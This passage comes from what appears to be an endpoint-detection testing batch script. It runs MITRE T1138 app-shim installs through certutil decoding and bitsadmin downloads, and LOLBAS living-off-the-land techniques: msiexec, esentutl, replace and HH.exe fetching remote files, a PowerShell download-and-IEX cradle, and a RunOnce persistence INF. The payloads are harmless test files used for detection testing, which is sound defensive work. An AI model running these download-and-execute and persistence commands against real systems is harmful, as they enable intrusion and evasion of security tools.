REM start line 327
REM end line 440


echo %time% %date% [+] T1138 - App Shim installation for Calc.exe via file decode
echo -----BEGIN CERTIFICATE----- > shim.64
echo AgAAAAEAAABzZGJmAnjeAAAAA3ggAAAAAjgHcAM4AWAWQAEAAAABmAwAAABFWEUu >> shim.64
echo Q0xBQ1IBAAADeA4AAAACOAdwAzgLYAGYAAAAAAN4DgAAAAI4B3ADOCBgAZgAAAAA >> shim.64
echo A3gOAAAAAjgEcAM4AWABmAAAAAADeA4AAAACOA1wAzgVQAGYAAAAAAN4FAAAAAI4 >> shim.64
echo EHADOAFgFkABAAAAAZgAAAAAA3gOAAAAAjgScAM4BpABmAAAAAADeBQAAAACOBJw >> shim.64
echo AzgEkBZAAQAAAAGYAAAAAAN4GgAAAAI4B3ADOASQAZgMAAAAKrpBuRQxAq9SAQAA >> shim.64
echo AXDgAAAAAVAJOgQMVR/UASJgBgAAAAFgHAAAACNAAQAAAAeQEAAAAO/VHM+BZc5A >> shim.64
echo oCyA7S3ObrkCcAAAAAALcB4AAAABYHAAAAAJcAYAAAABYIAAAAAJcAYAAAABYLoA >> shim.64
echo AAAHcH4AAAABYNgAAAAGYHAAAAAFYPAAAAAEkBAAAACpg6GdMzlyTIM54CQnCHDj >> shim.64
echo CHAyAAAAAWAKAQAACWAUAQAAEGBGAQAAEWCWAQAAAlBqRLEdAQAGAANQakSxHQEA >> shim.64
echo BgATYLoBAAAJcAwAAAABYLoAAAAIYNgAAAALcAYAAAABYBICAAABeCQCAAABiBAA >> shim.64
echo AAAyAC4AMQAuADAALgAzAAAAAYhOAAAAewBjAGYAMQBjAGQANQBlAGYALQA2ADUA >> shim.64
echo OAAxAC0ANAAwAGMAZQAtAGEAMAAyAGMALQA4ADAAZQBkADIAZABjAGUANgBlAGIA >> shim.64
echo OQB9AAAAAYgKAAAAYwBhAGwAYwAAAAGINAAAAEEAZABkAFAAcgBvAGMAZQBzAHMA >> shim.64
echo UABhAHIAYQBtAGUAdABlAHIAcwBGAGwAYQBnAHMAAAABiBgAAABSAGUAZABpAHIA >> shim.64
echo ZQBjAHQARQBYAEUAAAABiBIAAABjAGEAbABjAC4AZQB4AGUAAAABiBQAAABNAGkA >> shim.64
echo YwByAG8AcwBvAGYAdAAAAAGIBAAAACoAAAABiCwAAABNAGkAYwByAG8AcwBvAGYA >> shim.64
echo dAAgAEMAbwByAHAAbwByAGEAdABpAG8AbgAAAAGISgAAAE0AaQBjAHIAbwBzAG8A >> shim.64
echo ZgB0AK4AIABXAGkAbgBkAG8AdwBzAK4AIABPAHAAZQByAGEAdABpAG4AZwAgAFMA >> shim.64
echo eQBzAHQAZQBtAAAAAYgeAAAANgAuADEALgA3ADYAMAAxAC4AMgAzADQAMAAzAAAA >> shim.64
echo AYhSAAAANgAuADEALgA3ADYAMAAxAC4AMgAzADQAMAAzACAAKAB3AGkAbgA3AHMA >> shim.64
echo cAAxAF8AbABkAHIALgAxADYAMAAzADIANQAtADAANgAwADAAKQAAAAGIEgAAAFYA >> shim.64
echo aQBzAHQAYQBTAFAAMQAAAA== >> shim.64
echo -----END CERTIFICATE----- >> shim.64
start "" cmd /c certutil -f -decode shim.64 calc.sdb >nul
start "" cmd /c sdbinst /q calc.sdb
timeout 2
start "" cmd /c sdbinst -u calc.sdb
echo Execution Finished at %time% %date% 
echo Command Excuted: certutil -f -decode shim.64 calc.sdb
echo Command Excuted: sdbinst -q calc.sdb
echo Command Excuted: sdbinst -u calc.sdb

timeout 5

echo %time% %date% [+] T1138 - App Shim installation for Calc.exe via file download

start "" cmd /c bitsadmin.exe /transfer "JobName" https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/calc-exec.sdb "%cd%\calc2.sdb"
start "" cmd /c sdbinst /q calc2.sdb
timeout 2
start "" cmd /c sdbinst -u calc2.sdb
echo Execution Finished at %time% %date% 
echo Command Excuted: sdbinst -q calc2.sdb
echo Command Excuted: sdbinst -u calc2.sdb

timeout 5


echo **********************************************
echo *      Testing LOLBAS PAYLOADS               *
echo **********************************************
REM Payloads in this section were generated based on information in https://github.com/api0cradle/LOLBAS

echo %time% %date% [+] Testing msiexec exec
start "" cmd /c msiexec /q /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true  
start "" cmd /c msiexec /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true
echo Execution Finished at %time% %date%
echo Command Excuted: msiexec /q /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true 
echo Command Excuted: msiexec /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true
timeout 5
echo %time% %date% [+] Testing diskshadow exec
echo exec calc.exe > diskshadow.txt
start "" cmd /c  diskshadow.exe /s diskshadow.txt
echo Execution Finished at %time% %date%  
echo Command Excuted: exec calc.exe > diskshadow.txt
echo Command Excuted: diskshadow.exe /s diskshadow.txt
timeout 5
echo %time% %date% [+] Testing Esentutl.exe download & exec
start "" cmd /c  esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d adrestore.exe /o  
start "" cmd /c  adrestore.exe   
echo Execution Finished at %time% %date%  
echo Command Excuted: esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d adrestore.exe /o
echo Command Excuted: adrestore.exe
timeout 5
echo %time% %date% [+] Testing replace.exe download & exec
start "" cmd /c replace \\live.sysinternals.com\tools\adrestore.exe adrestore2.exe /A
start "" cmd /c adrestore2.exe   
echo Execution Finished at %time% %date% 
echo Command Excuted: replace \\live.sysinternals.com\tools\adrestore.exe adrestore2.exe /A
echo Command Excuted: adrestore2.exe  
timeout 5
echo %time% %date% [+] Testing SyncAppvPublishingServer.vbs download & exec
start "" cmd /c  C:\Windows\System32\SyncAppvPublishingServer.vbs "n;(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))"
echo Execution Finished at %time% %date% 
echo Command Excuted: C:\Windows\System32\SyncAppvPublishingServer.vbs "n;(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))"
timeout 5
echo %time% %date% [+] Testing HH.exe download
REM HH.exe does not handle HTTPS
start "" cmd /c  HH.exe http://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt
echo Execution Finished at %time% %date% 
echo Command Excuted: HH.exe http://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt
timeout 5
echo %time% %date% Testing ieexec.exe download & execute"exec"
start "" cmd /c  ieexec.exe https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true  
echo Execution Finished at %time% %date% 
echo Command Excuted: ieexec.exe https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true  
timeout 5
echo %time% %date% [+] Testing Setupapi driever installation & exec
echo ^; DRIVER.INF > calc.inf
echo ^; Copyright (c) Microsoft Corporation.  All rights reserved. >> calc.inf
echo [Version] >> calc.inf
echo Signature = "$CHICAGO$" >> calc.inf
echo Class=61883 >> calc.inf
echo ClassGuid={7EBEFBC0-3200-11d2-B4C2-00A0C9697D17} >> calc.inf
echo Provider=%Msft% >> calc.inf
echo DriverVer=06/21/2006,6.1.7600.16385 >> calc.inf
echo [DestinationDirs] >> calc.inf
echo DefaultDestDir = 1 >> calc.inf
echo [DefaultInstall] >> calc.inf
echo AddReg = CalcStart >> calc.inf
echo [CalcStart]
echo HKLM,Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce,Install,,cmd.exe /c """calc.exe""" >> calc.inf
